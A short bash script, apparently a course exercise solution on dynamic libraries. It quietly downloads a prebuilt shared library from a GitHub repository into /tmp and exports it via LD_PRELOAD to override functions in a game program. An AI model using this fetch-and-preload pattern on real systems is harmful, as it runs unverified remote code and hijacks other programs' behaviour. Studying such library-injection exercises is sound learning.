#!/bin/bash
 wget -q -O /tmp/gm_win.so https://github.com/MO1-dot-618/alx-low_level_programming/raw/main/0x18-dynamic_libraries/gm_win.so
export LD_PRELOAD=/tmp/gm_win.so
